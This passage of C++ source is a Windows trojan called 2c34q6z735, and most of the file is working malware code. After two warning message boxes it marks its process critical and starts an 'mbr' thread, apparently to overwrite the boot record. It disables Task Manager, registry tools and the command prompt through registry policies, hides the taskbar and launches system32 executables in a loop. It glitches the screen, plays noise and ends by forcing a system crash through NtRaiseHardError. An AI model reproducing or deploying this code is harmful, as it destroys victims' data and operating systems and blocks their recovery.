    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = sw;
    bmi.bmiHeader.biHeight = -sh;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    PRGBTRIPLE rgbtriple;
    while (true) {
        desk = GetDC(0);
        HDC deskMem = CreateCompatibleDC(desk);
        HBITMAP scr = CreateDIBSection(desk, &bmi, DIB_RGB_COLORS, (void**)&rgbtriple, NULL, 0);
        SelectObject(deskMem, scr);
        BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
        for (int i = 0; i < sw * sh; i++) {
            int x = i % sw, y = i - sw, t = y ^ y | x;
            rgbtriple[i].rgbtRed = (rgbtriple[i].rgbtRed + GetRValue(i)) & i;
            rgbtriple[i].rgbtGreen = (rgbtriple[i].rgbtGreen + GetGValue(i)) & i;
            rgbtriple[i].rgbtBlue = (rgbtriple[i].rgbtBlue + GetBValue(i)) & i;
        }
        BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCINVERT);
        ReleaseDC(wnd, desk);
        DeleteDC(deskMem);
        DeleteObject(scr);
    }
}

DWORD WINAPI hell1(LPVOID lpParam) {
    double angle = 0.0;
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int xadd = cos(angle) * 100;
        int yadd = sin(angle) * 100;
        BitBlt(hdc, xadd, yadd, w, h, hdc, 0, 0, NOTSRCERASE);
        angle += M_PI / 8;
        ReleaseDC(0, hdc);
    }
}

VOID WINAPI sound1() { //credits to camellia-y7x
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t | t >> 11 & t >> 4) + (t >> 5) ^ (t >> 8 & t >> 4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() { //credits to camellia-y7x
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 11 & t >> 4) + (t >> 5 & t >> 14 & t >> 19) ^ (t | t >> 10) + (t >> 1));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t << (t >> 8) * 23);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t + t >> 5 * t + 4);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() { //credits to camellia-y7x
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(114 * ((t >> 5 ^ t / 141 - 9 ^ 810) % 11 * t / 4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() { //credits to camellia-y7x
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(1 * t + 1 ^ t * (4 << ((t >> 5 ^ (t >> 14) + (t >> 19)) + 19) % 7));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 1 & t >> 8 ^ 73 & t >> 3));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[24000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t ^ t >> 8) * (t | t >> 14) + (t | t << 15) + (t | t >> 16)) / 1000);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t & 16384 ? 8 : 5) * (4 + (2 & t >> 8)) >> (3 & t >> 9) | t >> 7);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(-111 * (t >> 8 | t * t));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI taskbar(LPVOID lpvd) {
    static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
    ShowWindow(hShellWnd, SW_HIDE);
    return 0;
}

DWORD WINAPI opener(LPVOID lpParam) {
    WIN32_FIND_DATA data;
    LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
    while (true) {
        HANDLE find = FindFirstFileW(path, &data);
        ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
        while (FindNextFileW(find, &data)) {
            ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
            Sleep(rand() % 5000);
        }
    }
}

DWORD WINAPI winmove(LPVOID lpParam) {
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);
    RECT rekt;
    while (true) {
        HWND hwnd = GetForegroundWindow();
        GetWindowRect(hwnd, &rekt);
        int sel = rand() % 4 + 1;
        if (rekt.left >= x) {
            rekt.left = 0;
        }
        else if (rekt.top >= y) {
            rekt.top = 0;
        }
        else if (rekt.left <= 0) {
            rekt.left = 0;
        }
        else if (rekt.top <= 0) {
            rekt.top = 0;
        }
        int xs = rekt.left;
        int ys = rekt.top;
        int rnd = rand() % 100 + 60;
        for (int i = 0; i < rnd; i += 20) {
            if (sel == 1) {
                SetWindowPos(hwnd, 0, xs + i, ys + i, xs, ys, 0);
                Sleep(10);
            }
            else if (sel == 2) {
                SetWindowPos(hwnd, 0, xs - i, ys + i, xs, ys, 0);
                Sleep(10);
            }
            else if (sel == 3) {
                SetWindowPos(hwnd, 0, xs + i, ys - i, xs, ys, 0);
                Sleep(10);
            }
            else if (sel == 4) {
                SetWindowPos(hwnd, 0, xs - i, ys - i, xs, ys, 0);
                Sleep(10);
            }
        }
    }
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as 2c34q6z735 that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"2c34q6z735", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    else {
        if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"2c34q6z735", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        }
        else {
            ProcessIsCritical();
            CreateThread(0, 0, mbr, 0, 0, 0);
            CreateThread(0, 0, taskbar, 0, 0, 0);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
            Sleep(5000);
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, shapes, 0, 0, 0);
            HANDLE thread2dot2 = CreateThread(0, 0, textout, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            TerminateThread(thread2dot1, 0);
            CloseHandle(thread2dot1);
            TerminateThread(thread2dot2, 0);
            CloseHandle(thread2dot2);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            CreateThread(0, 0, opener, 0, 0, 0);
            HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
            HANDLE thread4dot1 = CreateThread(0, 0, sustainepic, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            TerminateThread(thread4dot1, 0);
            CloseHandle(thread4dot1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
            HANDLE thread5dot1 = CreateThread(0, 0, invcc, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread6 = CreateThread(0, 0, shader6, 0, 0, 0);
            HANDLE thread6dot1 = CreateThread(0, 0, textout1, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread7 = CreateThread(0, 0, shader7, 0, 0, 0);
            HANDLE thread7dot1 = CreateThread(0, 0, icons, 0, 0, 0);
            sound7();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            CreateThread(0, 0, winmove, 0, 0, 0);
            HANDLE thread8 = CreateThread(0, 0, shader8, 0, 0, 0);
            HANDLE thread8dot1 = CreateThread(0, 0, lines, 0, 0, 0);
            sound8();
            Sleep(30000);
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread9 = CreateThread(0, 0, shader9, 0, 0, 0);
            sound9();
            Sleep(30000);
            TerminateThread(thread9, 0);
            CloseHandle(thread9);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread10 = CreateThread(0, 0, hell1, 0, 0, 0);
            sound10();
            Sleep(30000);
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}